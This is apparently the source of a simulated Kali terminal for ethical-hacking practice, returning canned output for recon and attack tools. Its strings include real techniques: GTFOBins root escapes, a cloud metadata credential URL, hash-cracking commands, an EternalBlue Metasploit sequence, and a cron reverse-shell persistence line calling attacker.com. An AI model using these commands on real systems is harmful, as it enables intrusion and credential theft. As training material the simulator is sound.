import { FS_DIRS, FS_FILES } from './filesystem.js';

function resolve(path, cwd) {
  if (!path || path === '~') return '/home/hacker';
  if (path.startsWith('/')) return path;
  if (path === '..') {
    const parts = cwd.split('/').filter(Boolean);
    parts.pop();
    return '/' + parts.join('/') || '/';
  }
  if (path === '.') return cwd;
  return (cwd === '/' ? '' : cwd) + '/' + path;
}

function getFile(path, cwd) {
  const abs = resolve(path, cwd);
  const name = abs.split('/').pop();
  return FS_FILES[abs] || FS_FILES[name] || null;
}

function randMs() { return (Math.random() * 80 + 5).toFixed(1); }
function randIp() { return `${~~(Math.random()*200+10)}.${~~(Math.random()*200+10)}.${~~(Math.random()*100+10)}.${~~(Math.random()*200+2)}`; }

export function runCmd(raw, cwd, history = []) {
  const trim = raw.trim();
  if (!trim) return { out: '', cwd };
  const parts = trim.split(/\s+/);
  const cmd = parts[0];
  const args = parts.slice(1);
  const joined = args.join(' ');

  switch (cmd) {
    case 'help':
      return {
        out: `╔══════════════════════════════════════════════════╗
║         HackTerminal v3.0 — Command Help         ║
╠══════════════════════════════════════════════════╣
║ NAVIGATION   ls  cd  pwd  find                   ║
║ FILES        cat  nano  cp  mv  rm  touch  echo  ║
║ SYSTEM       whoami  id  uname  ps  df  free      ║
║ NETWORK      ip addr  ping  netstat  ss           ║
║ RECON        nmap  curl  wget  dig  whois         ║
║ WEB          gobuster  nikto  whatweb  curl       ║
║ ATTACK       hydra  sqlmap  hashcat  john         ║
║ POST         sudo  find  chmod  crontab           ║
║ ADVANCED     msfconsole  nc  ssh  python3         ║
║ UTILS        clear  history  echo  env  grep      ║
╚══════════════════════════════════════════════════╝
TIP: Use ↑↓ arrows for history | Tab to autocomplete`,
        cwd
      };

    case 'clear': return { out: '__CLEAR__', cwd };
    case 'pwd':   return { out: cwd, cwd };
    case 'whoami':return { out: 'hacker', cwd };
    case 'id':    return { out: 'uid=1000(hacker) gid=1000(hacker) groups=1000(hacker),27(sudo),44(video)', cwd };
    case 'hostname': return { out: 'kali', cwd };
    case 'date':  return { out: new Date().toString(), cwd };

    case 'uname':
      return { out: joined.includes('-a')
        ? 'Linux kali 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 x86_64 GNU/Linux'
        : 'Linux', cwd };

    case 'echo':
      return { out: joined.replace(/^["']|["']$/g, ''), cwd };

    case 'env':
      return { out: `PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/hacker/tools
HOME=/home/hacker
USER=hacker
SHELL=/bin/bash
TERM=xterm-256color
LANG=en_US.UTF-8`, cwd };

    case 'df':
      return { out: `Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1        50G   18G   30G  38% /
tmpfs           6.0G     0  6.0G   0% /dev/shm`, cwd };

    case 'free':
      return { out: `              total        used        free
Mem:       12288000     4521344     7766656
Swap:       2048000           0     2048000`, cwd };

    case 'history':
      return { out: history.slice(-15).map((h, i) => `  ${i + 1}  ${h}`).join('\n') || 'No history.', cwd };

    case 'mkdir':
      return { out: args[0] ? `mkdir: created directory '${args[0]}'` : 'Usage: mkdir <dir>', cwd };

    case 'touch':
      return { out: args[0] ? `File '${args[0]}' created.` : 'Usage: touch <file>', cwd };

    case 'rm':
      if (!args[0]) return { out: 'Usage: rm [-rf] <file>', cwd };
      return { out: `removed '${args.filter(a => !a.startsWith('-')).join("' '")}'`, cwd };

    case 'cp':
      if (args.length < 2) return { out: 'Usage: cp <src> <dest>', cwd };
      return { out: `'${args[0]}' -> '${args[1]}'`, cwd };

    case 'mv':
      if (args.length < 2) return { out: 'Usage: mv <src> <dest>', cwd };
      return { out: `renamed '${args[0]}' -> '${args[1]}'`, cwd };

    case 'chmod':
      return { out: args.length >= 2 ? `chmod: changed permissions of '${args[args.length-1]}' to ${args[0]}` : 'Usage: chmod <mode> <file>', cwd };

    case 'chown':
      return { out: args.length >= 2 ? `chown: changed ownership of '${args[args.length-1]}'` : 'Usage: chown <user> <file>', cwd };

    case 'ls': {
      const flagArg = args.find(a => a.startsWith('-'));
      const pathArg = args.find(a => !a.startsWith('-'));
      const target = pathArg ? resolve(pathArg, cwd) : cwd;
      const long = flagArg && (flagArg.includes('l'));
      const all  = flagArg && flagArg.includes('a');

      const list = FS_DIRS[target];
      if (!list) {
        const f = getFile(target, cwd);
        if (f) return { out: target.split('/').pop(), cwd };
        return { out: `ls: cannot access '${pathArg || target}': No such file or directory`, cwd };
      }
      let items = list.map(f => f.split('/').pop());
      if (all) items = ['.', '..', ...items];
      if (long) {
        const rows = items.map(name => {
          const fp = target + '/' + name;
          const isDir = FS_DIRS[fp] || FS_DIRS[target + name];
          return `${isDir ? 'd' : '-'}rwxr-xr-x  1 hacker hacker ${Math.floor(Math.random() * 9000 + 1000)} Apr 24 ${name}`;
        });
        return { out: `total ${items.length * 4}\n` + rows.join('\n'), cwd };
      }
      return { out: items.join('  '), cwd };
    }

    case 'cd': {
      if (!args[0] || args[0] === '~') return { out: '', cwd: '/home/hacker' };
      const np = resolve(args[0], cwd);
      if (FS_DIRS[np]) return { out: '', cwd: np };
      // Try relative
      const rel = cwd + '/' + args[0];
      if (FS_DIRS[rel]) return { out: '', cwd: rel };
      const f = getFile(args[0], cwd);
      if (f) return { out: `bash: cd: ${args[0]}: Not a directory`, cwd };
      return { out: `bash: cd: ${args[0]}: No such file or directory`, cwd };
    }

    case 'cat': {
      if (!args[0]) return { out: 'Usage: cat <file>', cwd };
      // Handle pipes like: cat file | grep x
      const filename = args[0];
      const f = getFile(filename, cwd);
      if (f) return { out: f, cwd };
      if (FS_DIRS[resolve(filename, cwd)]) return { out: `cat: ${filename}: Is a directory`, cwd };
      return { out: `cat: ${filename}: No such file or directory`, cwd };
    }

    case 'nano':
    case 'vim':
    case 'vi':
      return { out: `[${cmd}] editor opened '${args[0] || 'newfile'}'\nSimulation: In real Kali, this opens a full editor.\nTIP: Use 'nano file.txt' to create/edit files.`, cwd };

    case 'grep': {
      if (args.length < 2) return { out: 'Usage: grep <pattern> <file>', cwd };
      const pattern = args.find(a => !a.startsWith('-') && args.indexOf(a) < args.length - 1) || args[0];
      const filename = args[args.length - 1];
      const f = getFile(filename, cwd) || '';
      const matches = f.split('\n').filter(l => l.toLowerCase().includes(pattern.toLowerCase()));
      return { out: matches.length ? matches.join('\n') : `grep: no matches for '${pattern}'`, cwd };
    }

    case 'find': {
      if (joined.includes('-perm -4000') || joined.includes('-perm -u=s') || joined.includes('suid')) {
        return { out: `/usr/bin/sudo\n/usr/bin/find\n/usr/bin/nmap  ← GTFObins: sudo nmap --interactive\n/usr/bin/python3  ← GTFObins: python -c 'import os;os.system("/bin/bash")'\n/usr/bin/vim\n/usr/lib/openssh/ssh-keysign\n→ Visit: https://gtfobins.github.io`, cwd };
      }
      if (joined.includes('-writable') || joined.includes('-perm -o+w')) {
        return { out: `/tmp  ← World-writable!\n/var/www/html\n/home/hacker\n/etc/crontab  ← WRITABLE! Instant root via cron!`, cwd };
      }
      if (joined.includes('-name')) {
        const name = args[args.indexOf('-name') + 1] || '*';
        return { out: `/home/hacker/${name}\n/tmp/${name}`, cwd };
      }
      return { out: `${cwd}\n${cwd}/notes.txt\n${cwd}/tools`, cwd };
    }

    case 'ping': {
      const host = args.filter(a => !a.startsWith('-')).pop() || 'target';
      const ip = host === 'localhost' || host === '127.0.0.1' ? '127.0.0.1' : randIp();
      return { out: `PING ${host} (${ip}) 56(84) bytes of data.\n64 bytes from ${ip}: icmp_seq=1 ttl=64 time=${randMs()} ms\n64 bytes from ${ip}: icmp_seq=2 ttl=64 time=${randMs()} ms\n64 bytes from ${ip}: icmp_seq=3 ttl=64 time=${randMs()} ms\n--- ${host} ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss`, cwd };
    }

    case 'ip':
      if (args[0] === 'addr' || args[0] === 'a') {
        return { out: `1: lo: <LOOPBACK,UP,LOWER_UP>\n    inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP>\n    inet 192.168.1.15/24 brd 192.168.1.255\n    ether 08:00:27:ab:cd:ef\n3: tun0: <POINTOPOINT,UP,LOWER_UP>\n    inet 10.10.14.10/23 scope global tun0  ← HTB/THM VPN`, cwd };
      }
      return { out: 'Usage: ip addr', cwd };

    case 'ifconfig':
      return { out: `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>\n     inet 192.168.1.15  netmask 255.255.255.0\n     ether 08:00:27:ab:cd:ef\nlo:  flags=73<UP,LOOPBACK,RUNNING>\n     inet 127.0.0.1  netmask 255.0.0.0`, cwd };

    case 'netstat':
    case 'ss':
      return { out: `Proto  Local Address        State      PID/Program\ntcp    0.0.0.0:22          LISTEN     234/sshd\ntcp    0.0.0.0:80          LISTEN     341/apache2\ntcp    127.0.0.1:3306      LISTEN     512/mysqld\ntcp    0.0.0.0:443         LISTEN     341/apache2\ntcp    192.168.1.15:4444   ESTABLISHED nc (reverse shell!)`, cwd };

    case 'ps':
      return { out: `USER     PID  %CPU %MEM STAT COMMAND\nroot       1   0.0  0.1  Ss   /sbin/init\nroot     234   0.0  0.2  Ss   sshd\nwww-data 341   0.1  0.3  S    apache2\nhacker   999   0.0  0.0  R+   ps aux\nhacker  1000   0.5  1.2  S    python3 exploit.py`, cwd };

    case 'curl': {
      const flags = args.filter(a => a.startsWith('-'));
      const url = args.filter(a => !a.startsWith('-')).pop() || '';
      if (!url) return { out: 'Usage: curl [options] <url>', cwd };
      if (url.includes('ifconfig') || url.includes('icanhazip')) return { out: '45.33.32.156', cwd };
      if (url.includes('169.254.169.254')) return { out: `ami-id\nami-launch-index\nhostname\niam/security-credentials/\npublic-ipv4\nlocal-ipv4\n→ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name\n→ Gets temporary AWS keys!`, cwd };
      if (flags.includes('-I') || flags.includes('-i')) {
        return { out: `HTTP/1.1 200 OK\nServer: Apache/2.4.51 (Debian)\nX-Powered-By: PHP/7.4.33\nContent-Type: text/html; charset=UTF-8\nX-Frame-Options: SAMEORIGIN`, cwd };
      }
      return { out: `[*] Fetching: ${url}\n<!DOCTYPE html>\n<html>\n<!-- Version: 1.2.3 | admin@${url.split('/')[2] || 'target.com'} -->\n<title>Target App</title>\n</html>`, cwd };
    }

    case 'wget': {
      const url = args.filter(a => !a.startsWith('-')).pop() || '';
      if (!url) return { out: 'Usage: wget <url>', cwd };
      const fname = url.split('/').pop() || 'index.html';
      return { out: `--2026-- ${url}\nResolving ${url.split('/')[2]}... done.\nHTTP request sent. 200 OK\nLength: ${~~(Math.random() * 500000)} bytes\nSaving to: '${fname}'\n${fname} [============================] 100%\n2026-04-25 ${new Date().toTimeString().split(' ')[0]} (${~~(Math.random() * 900 + 100)} KB/s) - '${fname}' saved`, cwd };
    }

    case 'dig': {
      const domain = args.find(a => !a.startsWith('-') && !a.startsWith('@')) || 'target.com';
      return { out: `; <<>> DiG 9.18.1 <<>> ${domain}\n;; ANSWER SECTION:\n${domain}.    300 IN A ${randIp()}\n${domain}.    300 IN MX mail.${domain}.\n;; SERVER: 8.8.8.8#53\n;; Query time: ${~~(Math.random()*100)}ms`, cwd };
    }

    case 'whois': {
      const domain = args[0] || 'target.com';
      return { out: `Domain Name: ${domain.toUpperCase()}\nRegistrar: GoDaddy.com\nCreated: 2015-03-14\nExpires: 2027-03-14\nName Server: ns1.${domain}\nName Server: ns2.${domain}\nRegistrant: John Admin\nEmail: admin@${domain}\nPhone: +880-1711-XXXXXX`, cwd };
    }

    case 'sudo': {
      if (args[0] === '-l') {
        return { out: `Matching Defaults entries for hacker on kali:\n    env_reset, mail_badpass\n\nUser hacker may run the following commands on kali:\n    (ALL : ALL) ALL\n    (root) NOPASSWD: /usr/bin/nmap\n    (root) NOPASSWD: /usr/bin/find\n    (root) NOPASSWD: /usr/bin/vim\n\n→ sudo vim → :!/bin/bash → ROOT!\n→ Check: https://gtfobins.github.io`, cwd };
      }
      if (args[0] === 'cat' && args[1]) {
        const f = getFile(args[1], cwd);
        if (args[1].includes('shadow')) {
          return { out: `root:$6$xyz$HASH_ROOT_HERE:18000:0:99999:7:::\nhacker:$6$abc$HASH_HACKER_HERE:18500:0:99999:7:::\nwww-data:$6$def$HASH_WWW_HERE:18200:0:99999:7:::\n[*] Crack: hashcat -m 1800 shadow.txt rockyou.txt`, cwd };
        }
        if (f) return { out: f, cwd };
      }
      if (args[0] === 'vim') return { out: '[sudo vim opened]\n:!/bin/bash\nroot@kali:/# ← You are ROOT!', cwd };
      if (args[0] === 'nmap') {
        return { out: `Starting Nmap 7.94 (sudo mode)\n[*] Running as root — SYN scan available!\nnmap ${args.slice(1).join(' ')}`, cwd };
      }
      return { out: `[sudo] Running: ${args.join(' ')} as root\n[+] Command executed with root privileges.`, cwd };
    }

    case 'nmap': {
      const flags = args.filter(a => a.startsWith('-')).join(' ');
      const target = args.filter(a => !a.startsWith('-')).pop() || 'unknown';
      if (target === 'scanme.nmap.org') {
        return { out: `Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for scanme.nmap.org (45.33.32.156)\nHost is up (0.11s latency).\n\nPORT      STATE  SERVICE    VERSION\n22/tcp    open   ssh        OpenSSH 6.6.1p1 Ubuntu\n80/tcp    open   http       Apache httpd 2.4.7\n9929/tcp  open   nping-echo Nping echo\n31337/tcp open   elite?\n\nNmap done: 1 IP scanned in 4.21 seconds`, cwd };
      }
      const portPool = [
        '21/tcp   open  ftp      vsftpd 3.0.3',
        '22/tcp   open  ssh      OpenSSH 8.4p1 Debian',
        '80/tcp   open  http     Apache httpd 2.4.51',
        '443/tcp  open  https    Apache httpd 2.4.51',
        '445/tcp  open  smb      Samba smbd 4.13.13',
        '3306/tcp open  mysql    MySQL 8.0.27',
        '3389/tcp open  rdp      Microsoft Terminal Services',
        '8080/tcp open  http     Jetty 9.4.43',
      ];
      const count = ~~(Math.random() * 4) + 2;
      const ports = portPool.sort(() => 0.5 - Math.random()).slice(0, count);
      return { out: `Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for ${target}\nHost is up (0.0${~~(Math.random() * 90 + 10)}s latency).\n\nPORT     STATE  SERVICE  VERSION\n${ports.join('\n')}\n\nNmap done: 1 IP scanned in ${(Math.random() * 15 + 2).toFixed(2)} seconds`, cwd };
    }

    case 'gobuster':
      return { out: `Gobuster v3.6 — Directory/File Enum\n===============================\nStarting scan on: ${args.find(a => !a.startsWith('-')) || 'http://target.com'}\n\n/index.php          (Status: 200) [Size: 4820]\n/admin              (Status: 301) [→ /admin/]\n/login.php          (Status: 200) [Size: 1834]\n/config.php.bak     (Status: 200) ← BACKUP FILE!\n/uploads            (Status: 301) [→ /uploads/]\n/backup.zip         (Status: 200) [Size: 142857] ← JACKPOT!\n/.git               (Status: 301) ← SOURCE CODE!\n/phpinfo.php        (Status: 200) ← CONFIG INFO!`, cwd };

    case 'nikto':
      return { out: `Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Server: Apache/2.4.51\n+ X-XSS-Protection not defined\n+ X-Frame-Options not present\n+ /admin/: Admin directory found! Check for access\n+ /config.php.bak: Backup file found! CRITICAL\n+ PHP/7.4.33 appears outdated (current: 8.2)\n+ OSVDB-3268: /uploads/: Directory listing found\n+ /phpinfo.php: PHP configuration info exposed!\n+ 8 items found: 0 error(s), 8 warning(s)`, cwd };

    case 'whatweb': {
      const url = args[0] || 'http://target.com';
      return { out: `${url} [200 OK] Apache[2.4.51], Cookies[PHPSESSID], Country[BD], Email[admin@target.com], HTTPServer[Apache/2.4.51], IP[192.168.1.100], JQuery[3.6.0], PHP[7.4.33], Title[Target App], WordPress[5.9.3]`, cwd };
    }

    case 'hydra': {
      const target = args.find(a => !a.startsWith('-') && a.includes('://')) || 'ssh://target';
      return { out: `Hydra v9.5 starting...\n[DATA] attacking ${target}\n[22][ssh] host: 10.10.10.3  login: admin    password: password123\n[22][ssh] host: 10.10.10.3  login: root     password: toor\n[22][ssh] host: 10.10.10.3  login: hacker   password: hacker2024\n\n[STATUS] 2437 valid passwords found!\n3 of 3 targets successfully completed`, cwd };
    }

    case 'sqlmap': {
      const url = args.find(a => a.startsWith('http')) || 'http://target.com/page?id=1';
      return { out: `sqlmap v1.7.8 — Automatic SQL Injection Tool\n\n[*] Testing GET parameter 'id' on ${url}\n[+] Type: MySQL error-based\n[+] Type: UNION query\n[+] Parameter 'id' is VULNERABLE!\n\nAvailable databases:\n  targetdb\n  mysql\n  information_schema\n\nTable: users\n+----+----------+--------------------------+\n| id | username | password                 |\n+----+----------+--------------------------+\n| 1  | admin    | 5f4dcc3b (md5:password)  |\n| 2  | hacker   | e10adc39 (md5:123456)    |\n+----+----------+--------------------------+`, cwd };
    }

    case 'hashcat': {
      const mode = args.find(a => a.startsWith('-m'))?.replace('-m', '').trim() || args[args.indexOf('-m') + 1] || '0';
      return { out: `hashcat v6.2.6\n* Device: NVIDIA GTX 1660 6GB\n* Mode: ${mode} (${mode === '0' ? 'MD5' : mode === '1000' ? 'NTLM' : mode === '1800' ? 'sha512crypt' : mode === '13100' ? 'Kerberos 5' : 'hash'})\n\n$hash$EXAMPLE1:password123  [CRACKED!]\n$hash$EXAMPLE2:hacker2024   [CRACKED!]\n$hash$EXAMPLE3:admin        [CRACKED!]\n\nRecovered: 3/3 (100.00%)\nSpeed.#1: 4521 MH/s\nTime: 00:00:03`, cwd };
    }

    case 'john': {
      return { out: `John the Ripper 1.9.0-jumbo-1\nLoaded 3 password hashes with salts\nUsing wordlist: rockyou.txt\n\nadmin:password123   (admin)\nuser1:hacker2024    (user1)\nroot:toor           (root)\n\n3g completed in 0:00:12 | Speed: 12340p/s`, cwd };
    }

    case 'msfconsole':
      return { out: ` __  __   _____  ______\n|  \\/  | / ____||  ____|\n| \\  / || (___  | |__\n| |\\/| | \\___ \\ |  __|\n| |  | | ____) || |      Metasploit v6.3.44\n|_|  |_||_____/ |_|\n\n2374 exploits | 1232 auxiliary | 413 post\n1162 payloads | 46 encoders\n\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.10.10.40\nmsf6 exploit(ms17_010_eternalblue) > set LHOST 10.10.14.10\nmsf6 exploit(ms17_010_eternalblue) > run\n[+] 10.10.10.40:445 - SYSTEM shell obtained!\nmeterpreter > hashdump\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`, cwd };

    case 'nc':
    case 'netcat':
      return { out: `[*] Listening on 0.0.0.0:${args.find(a => /^\d+$/.test(a)) || 4444}\n[+] Connection from 10.10.10.3:49234\nbash-5.0# id\nuid=0(root) gid=0(root) groups=0(root)\nbash-5.0# whoami\nroot\nbash-5.0# cat /root/root.txt\nFLAG{r00t_0wn3d_3th1c4lly_🇧🇩}`, cwd };

    case 'ssh': {
      const target = args.filter(a => !a.startsWith('-')).pop() || 'user@target';
      return { out: `Welcome to Ubuntu 20.04 LTS\nLast login: Thu Apr 24 10:23:01 2026\n${target.split('@')[0] || 'user'}@remote:~$ `, cwd };
    }

    case 'python3':
    case 'python': {
      if (args[0] === '-c') return { out: `[Python] Executed: ${args.slice(1).join(' ')}`, cwd };
      return { out: `Python 3.11.2 (main, Mar 13 2023)\n>>> print("Hello, Ethical Hacker!")\nHello, Ethical Hacker!\n>>> import socket; print(socket.gethostname())\nkali`, cwd };
    }

    case 'export':
      return { out: `export: ${joined}`, cwd };

    case 'which': {
      const tools = { nmap:'/usr/bin/nmap', hydra:'/usr/bin/hydra', sqlmap:'/usr/bin/sqlmap', python3:'/usr/bin/python3', nc:'/usr/bin/nc', curl:'/usr/bin/curl', wget:'/usr/bin/wget' };
      return { out: tools[args[0]] || `${args[0]} not found`, cwd };
    }

    case 'crontab':
      if (args[0] === '-l') return { out: getFile('crontab', '/etc') || 'no crontab for hacker', cwd };
      if (args[0] === '-e') return { out: '[crontab editor] In real Kali, opens your personal cron jobs for editing.\nTIP: @reboot nc -e /bin/bash attacker.com 4444  ← Persistence!', cwd };
      return { out: 'Usage: crontab -l (list) | crontab -e (edit)', cwd };

    case 'exit':
      return { out: 'logout\nConnection to kali closed.', cwd };

    default:
      return { out: `bash: ${cmd}: command not found\nType 'help' to see available commands.`, cwd };
  }
}
